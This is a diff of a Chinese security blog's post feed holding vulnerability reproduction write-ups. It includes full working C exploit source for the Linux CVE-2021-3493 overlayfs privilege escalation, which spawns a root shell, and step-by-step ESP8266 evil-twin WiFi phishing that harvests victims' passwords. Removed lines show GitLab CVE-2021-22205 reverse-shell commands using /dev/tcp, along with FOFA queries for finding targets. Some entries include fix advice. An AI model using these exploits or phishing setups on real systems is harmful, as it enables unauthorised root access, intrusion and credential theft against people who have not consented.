+<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="版本检测"><a href="#版本检测" class="headerlink" title="版本检测"></a>版本检测</h4><p>相关用户可通过版本检测的方法判断当前应用是否存在风险。<br>使用如下命令可查看当前GitLab的版本：</p>
+<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"></p>
+<h4 id="官方升级"><a href="#官方升级" class="headerlink" title="官方升级"></a>官方升级</h4><p>目前官方已发布新版本修复了该漏洞，请受影响的用户尽快升级至最新版本进行防护，官方下载链接如下：<a href="https://about.gitlab.com/update/">https://about.gitlab.com/update/</a></p>
+<h4 id="临时防护措施"><a href="#临时防护措施" class="headerlink" title="临时防护措施"></a>临时防护措施</h4><p>若相关用户暂时无法进行升级操作，可使用白名单限制对Web端口的访问。配置访问控制策略，避免受影响的GitLab暴露在公网</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/cn-gov/p/15490588.html">https://www.cnblogs.com/cn-gov/p/15490588.html</a><br><a href="https://zhuanlan.zhihu.com/p/426847373">https://zhuanlan.zhihu.com/p/426847373</a><br><a href="https://www.cnblogs.com/ybit/p/14918949.html">https://www.cnblogs.com/ybit/p/14918949.html</a><br><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.11</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackDemo钓鱼篇①——WiFi钓鱼</title>
+    <url>/2022/06/01/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/</url>
+    <content><![CDATA[<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>如今的生活中社工攻击屡见不鲜，其中钓鱼是最为有效而且危害最大的一种攻击手法。攻击者常会伪装成官方、管理员或上级领导向受害者发送信息核实的请求，一旦受害者粗心大意接受了此类请求，其个人信息就会存在泄露的风险。本篇将以一个简单的HackDemo为例子，复现黑客在WiFi钓鱼中的惯用思路，供大家学习和参考。</p>
+<a id="more"></a>
+
+<h3 id="实现工具"><a href="#实现工具" class="headerlink" title="实现工具"></a>实现工具</h3><ul>
+<li><p>Esp8266开发板CH340</p>
+</li>
+<li><p>flash_download_tools_v3.6.5烧录软件</p>
+</li>
+<li><p>DNS.ino.ino.nodemcu.bin烧录文件</p>
+</li>
+<li><p>Arduino IDE_v1.8.5</p>
+</li>
+<li><p>ESP8266 Sketch Data Upload插件</p>
+<p>链接：<a href="https://pan.baidu.com/s/1l7Z7BLVOLnfumrx4GRPVDQ">https://pan.baidu.com/s/1l7Z7BLVOLnfumrx4GRPVDQ</a><br>提取码：2jp2</p>
+</li>
+</ul>
+<h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><p>连接好Esp8266开发板，在设备管理器中可以查看到对应的端口，如果没有识别需要安装一下驱动(CH341SER.EXE)，默认下一步即可。<br><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/1.png" alt="图片"></p>
+<p>打开flash_download_tools_v3.6.5.exe对开发板进行烧录，点击选择ESP8266 DownloadTool</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/2.png" alt="图片"></p>
+<p>载入DNS.ino.ino.nodemcu.bin文件，选择80MHz、QIO、32Mbit、[对应的端口]、1152000，然后点击START进行烧录，等进度条跑完</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/3.png" alt="图片"></p>
+<p>这时我们发现有一个名字是HH的新wifi，如果没有可以尝试将开发板重新拔插一下。</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/4.png" alt="图片"></p>
+<p>接下来安装Arduino，将工具包中tools目录下的内容拷贝到安装好的Arduino下的tools目录，可以发现在工具栏中多了两个插件。选择工具-&gt;开发板:”Arduino/Genuino Uno”-&gt;开发板管理器</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/8.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/5.png" alt="图片"></p>
+<p>在搜索框输入esp，选择下面的这个安装2.2.0版本</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/6.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/7.png" alt="图片"></p>
+<p>新建一个文件，保存到一个路径，然后点击工具-&gt;ESP8266 Sketch Data Upload，弹窗选择否，可以看到保存的文件目录下生成了data文件夹，我们将工具包里data目录下的三个html文件拷贝到生成的data文件夹里</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/9.png" alt="图片"></p>
+<p>选择工具栏下的开发板信息(按照自己的设备配置)，然后再次点击ESP8266 Sketch Data Upload</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/10.png" alt="图片"></p>
+<p>这个过程可能会进行1-2分钟，过程中开发板上的灯光长亮，等灯光熄灭就完成了</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/11.jpg" alt="图片"></p>
+<p>完成以后，连接HH，密码为m1234567，如果没有找到可以尝试重新拔插一下开发板或者重开一下电脑的wifi，连接上访问127.0.0.1/backdoor.html，这是钓鱼的后台，可以看到列出了附近的所有wifi，我们选择通用型，输入想要伪造的wifi序号，点击确认。</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/11.png" alt="图片"></p>
+<p>跳转到提示SSID伪造成功</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/12.png" alt="图片"></p>
+<p>我们连接伪造的这个wifi，没有密码，自动跳转到钓鱼页面，如果受害者安全意识不强可能会填写管理员密码，至此鱼就上钩了。</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/13.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/14.png" alt="图片"></p>
+<p>受害者点击开始升级会跳转到一个进度条，这些都没什么用，只是给受害者看的。攻击者可以在backdoor看到钓到的密码，至此整个wifi钓鱼成功！</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/15.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/16.png" alt="图片"></p>
+<p>小伙伴们还是要抱着练习的态度进行复现哦，以防走火入魔！</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.bilibili.com/video/BV1tU4y137yi?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1tU4y137yi?spm_id_from=333.999.0.0</a></p>
+]]></content>
+      <categories>
+        <category>社工安全</category>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>2022.6</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【CVE-2021-3493】Linux kernel权限提升漏洞复现</title>
+    <url>/2021/04/25/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9ECVE-2021-3493%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>linux kernel一般指Linux内核。Linux是一种开源电脑操作系统内核。它是一个用C语言写成，符合POSIX标准的类Unix操作系统。<br>linux内核中的overlayfs文件系统中没有正确地验证用户名称空间和底层文件系统中文件功能的设置。由于非特权用户名称空间和Ubuntu内核中允许非特权覆盖的补丁的组合，攻击者可以使用它来获得更高的特权。</p>
+<a id="more"></a>
+
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Ubuntu 20.10<br>Ubuntu 20.04 LTS<br>Ubuntu 18.04 LTS<br>Ubuntu 16.04 LTS<br>Ubuntu 14.04 ESM</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre class="line-numbers language-none"><code class="language-none">uname -a              显示电脑以及操作系统的相关信息
+cat &#x2F;etc&#x2F;issue        显示发行版本信息
+cat &#x2F;proc&#x2F;version     显示正在运行的内核版本
+lsb_release -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/1.png" alt="图片"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><pre class="line-numbers language-none"><code class="language-none">gcc exploit.c -o exploit     编译
+chmod +x exploit             给执行权限
+.&#x2F;exploit                    执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>可以看到前后权限有所提升，用户权限–&gt;管理员权限<br><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/2.png" alt="图片"></p>
+<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p><a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;exploit.c
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;err.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;sys&#x2F;types.h&gt;
+#include &lt;sys&#x2F;stat.h&gt;
+#include &lt;sys&#x2F;wait.h&gt;
+#include &lt;sys&#x2F;mount.h&gt;
+
+&#x2F;&#x2F;#include &lt;attr&#x2F;xattr.h&gt;
+&#x2F;&#x2F;#include &lt;sys&#x2F;xattr.h&gt;
+int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
+
+
+#define DIR_BASE    &quot;.&#x2F;ovlcap&quot;
+#define DIR_WORK    DIR_BASE &quot;&#x2F;work&quot;
+#define DIR_LOWER   DIR_BASE &quot;&#x2F;lower&quot;
+#define DIR_UPPER   DIR_BASE &quot;&#x2F;upper&quot;
+#define DIR_MERGE   DIR_BASE &quot;&#x2F;merge&quot;
+#define BIN_MERGE   DIR_MERGE &quot;&#x2F;magic&quot;
+#define BIN_UPPER   DIR_UPPER &quot;&#x2F;magic&quot;
+
+
+static void xmkdir(const char *path, mode_t mode)
+&#123;
+    if (mkdir(path, mode) &#x3D;&#x3D; -1 &amp;&amp; errno !&#x3D; EEXIST)
+        err(1, &quot;mkdir %s&quot;, path);
+&#125;
+
+static void xwritefile(const char *path, const char *data)
+&#123;
+    int fd &#x3D; open(path, O_WRONLY);
+    if (fd &#x3D;&#x3D; -1)
+        err(1, &quot;open %s&quot;, path);
+    ssize_t len &#x3D; (ssize_t) strlen(data);
+    if (write(fd, data, len) !&#x3D; len)
+        err(1, &quot;write %s&quot;, path);
+    close(fd);
+&#125;
+
+static void xcopyfile(const char *src, const char *dst, mode_t mode)
+&#123;
+    int fi, fo;
+
+    if ((fi &#x3D; open(src, O_RDONLY)) &#x3D;&#x3D; -1)
+        err(1, &quot;open %s&quot;, src);
+    if ((fo &#x3D; open(dst, O_WRONLY | O_CREAT, mode)) &#x3D;&#x3D; -1)
+        err(1, &quot;open %s&quot;, dst);
+
+    char buf[4096];
+    ssize_t rd, wr;
+
+    for (;;) &#123;
+        rd &#x3D; read(fi, buf, sizeof(buf));
+        if (rd &#x3D;&#x3D; 0) &#123;
+            break;
+        &#125; else if (rd &#x3D;&#x3D; -1) &#123;
+            if (errno &#x3D;&#x3D; EINTR)
+                continue;
+            err(1, &quot;read %s&quot;, src);
+        &#125;
+
+        char *p &#x3D; buf;
+        while (rd &gt; 0) &#123;
+            wr &#x3D; write(fo, p, rd);
+            if (wr &#x3D;&#x3D; -1) &#123;
+                if (errno &#x3D;&#x3D; EINTR)
+                    continue;
+                err(1, &quot;write %s&quot;, dst);
+            &#125;
+            p +&#x3D; wr;
+            rd -&#x3D; wr;
+        &#125;
+    &#125;
+
+    close(fi);
+    close(fo);
+&#125;
+
+static int exploit()
+&#123;
+    char buf[4096];
+
+    sprintf(buf, &quot;rm -rf &#39;%s&#x2F;&#39;&quot;, DIR_BASE);
+    system(buf);
+
+    xmkdir(DIR_BASE, 0777);
+    xmkdir(DIR_WORK,  0777);
+    xmkdir(DIR_LOWER, 0777);
+    xmkdir(DIR_UPPER, 0777);
+    xmkdir(DIR_MERGE, 0777);
+
+    uid_t uid &#x3D; getuid();
+    gid_t gid &#x3D; getgid();
+
+    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) &#x3D;&#x3D; -1)
+        err(1, &quot;unshare&quot;);
+
+    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;setgroups&quot;, &quot;deny&quot;);
+
+    sprintf(buf, &quot;0 %d 1&quot;, uid);
+    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;uid_map&quot;, buf);
+
+    sprintf(buf, &quot;0 %d 1&quot;, gid);
+    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;gid_map&quot;, buf);
+
+    sprintf(buf, &quot;lowerdir&#x3D;%s,upperdir&#x3D;%s,workdir&#x3D;%s&quot;, DIR_LOWER, DIR_UPPER, DIR_WORK);
+    if (mount(&quot;overlay&quot;, DIR_MERGE, &quot;overlay&quot;, 0, buf) &#x3D;&#x3D; -1)
+        err(1, &quot;mount %s&quot;, DIR_MERGE);
+
+    &#x2F;&#x2F; all+ep
+    char cap[] &#x3D; &quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;;
+
+    xcopyfile(&quot;&#x2F;proc&#x2F;self&#x2F;exe&quot;, BIN_MERGE, 0777);
+    if (setxattr(BIN_MERGE, &quot;security.capability&quot;, cap, sizeof(cap) - 1, 0) &#x3D;&#x3D; -1)
+        err(1, &quot;setxattr %s&quot;, BIN_MERGE);
+
+    return 0;
+&#125;
+
+int main(int argc, char *argv[])
+&#123;
+    if (strstr(argv[0], &quot;magic&quot;) || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;shell&quot;))) &#123;
+        setuid(0);
+        setgid(0);
+        execl(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;&#x2F;bin&#x2F;bash&quot;, &quot;--norc&quot;, &quot;--noprofile&quot;, &quot;-i&quot;, NULL);
+        err(1, &quot;execl &#x2F;bin&#x2F;bash&quot;);
+    &#125;
+
+    pid_t child &#x3D; fork();
+    if (child &#x3D;&#x3D; -1)
+        err(1, &quot;fork&quot;);
+
+    if (child &#x3D;&#x3D; 0) &#123;
+        _exit(exploit());
+    &#125; else &#123;
+        waitpid(child, NULL, 0);
+    &#125;
+
+    execl(BIN_UPPER, BIN_UPPER, &quot;shell&quot;, NULL);
+    err(1, &quot;execl %s&quot;, BIN_UPPER);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>更新Linux内核至5.11</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw">https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw</a><br><a href="https://blog.csdn.net/Appleteachers/article/details/116018035">https://blog.csdn.net/Appleteachers/article/details/116018035</a></p>
+]]></content>
+      <categories>
+        <category>Linux安全</category>
+        <category>系统安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.4</tag>
       </tags>
   </entry>
   <entry>
@@ -685,221 +959,6 @@ app&#x3D;&quot;Joomla&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hid
       </categories>
       <tags>
         <tag>2021.3</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【CVE-2021-22205】GitLab 远程命令执行漏洞复现</title>
-    <url>/2021/11/07/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;GitLab&quot;
-app&#x3D;&quot;GitLab&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<a id="more"></a>
-
-<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。<br>由于GitLab存在未授权的端点，导致该漏洞在无需进行身份验证的情况下即可进行利用，社区版(CE)和企业版(EE)皆受影响。由于GitLab中的ExifTool没有对传入的图像文件的扩展名进行正确处理，攻击者通过上传特制的恶意图片，可以在目标服务器上执行任意命令。<br><strong>根本原因</strong><br>1.当上传图片文件时，Gitlab Workhorse将扩展名为jpg|jpeg|tiff的文件通过ExifTool删除任何非白名单标记。<br>2.其中一个支持的格式是DjVu。当解析DjVu注释时，标记被赋值为convert C escape sequences。</p>
-<p>Gitlab链接：<br><a href="https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/">https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/</a></p>
-<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：9.9 | 高危</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>11.9 &lt;= Gitlab CE/EE &lt; 13.8.8<br>12.13.9 &lt;= Gitlab CE/EE &lt; 13.9.6<br>13.13.10 &lt;= Gitlab CE/EE &lt; 13.10.3</p>
-<h3 id="漏洞PoC"><a href="#漏洞PoC" class="headerlink" title="漏洞PoC"></a>漏洞PoC</h3><p><a href="https://github.com/RedTeamWing/CVE-2021-22205">https://github.com/RedTeamWing/CVE-2021-22205</a><br><a href="https://github.com/Al1ex/CVE-2021-22205">https://github.com/Al1ex/CVE-2021-22205</a></p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="证明存在"><a href="#证明存在" class="headerlink" title="证明存在"></a>证明存在</h4><p>先修改PoC里面的dnslog地址为自己的<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>利用PoC，我这里用的是pocsuite3测试框架<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>发现自己的dnslog有回显，证明利用成功，该站存在此漏洞<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
-<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这里利用的是前面的第二个PoC</p>
-<pre class="line-numbers language-none"><code class="language-none">反弹shell：
-
-python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;echo &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;1.sh&quot;
-这条语句意思是代表，将反弹shell命令写成sh脚本 到tmp目录下
-python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;chmod +x &#x2F;tmp&#x2F;1.sh&quot;
-这条语句意思是代表，对写入成功的sh脚本加执行权限
-python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.sh&quot;
-这条语句意思是代表，运行反弹shell脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"></p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="版本检测"><a href="#版本检测" class="headerlink" title="版本检测"></a>版本检测</h4><p>相关用户可通过版本检测的方法判断当前应用是否存在风险。<br>使用如下命令可查看当前GitLab的版本：</p>
-<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"></p>
-<h4 id="官方升级"><a href="#官方升级" class="headerlink" title="官方升级"></a>官方升级</h4><p>目前官方已发布新版本修复了该漏洞，请受影响的用户尽快升级至最新版本进行防护，官方下载链接如下：<a href="https://about.gitlab.com/update/">https://about.gitlab.com/update/</a></p>
-<h4 id="临时防护措施"><a href="#临时防护措施" class="headerlink" title="临时防护措施"></a>临时防护措施</h4><p>若相关用户暂时无法进行升级操作，可使用白名单限制对Web端口的访问。配置访问控制策略，避免受影响的GitLab暴露在公网</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/cn-gov/p/15490588.html">https://www.cnblogs.com/cn-gov/p/15490588.html</a><br><a href="https://zhuanlan.zhihu.com/p/426847373">https://zhuanlan.zhihu.com/p/426847373</a><br><a href="https://www.cnblogs.com/ybit/p/14918949.html">https://www.cnblogs.com/ybit/p/14918949.html</a><br><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2021.11</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【CVE-2021-3493】Linux kernel权限提升漏洞复现</title>
-    <url>/2021/04/25/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9ECVE-2021-3493%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>linux kernel一般指Linux内核。Linux是一种开源电脑操作系统内核。它是一个用C语言写成，符合POSIX标准的类Unix操作系统。<br>linux内核中的overlayfs文件系统中没有正确地验证用户名称空间和底层文件系统中文件功能的设置。由于非特权用户名称空间和Ubuntu内核中允许非特权覆盖的补丁的组合，攻击者可以使用它来获得更高的特权。</p>
-<a id="more"></a>
-
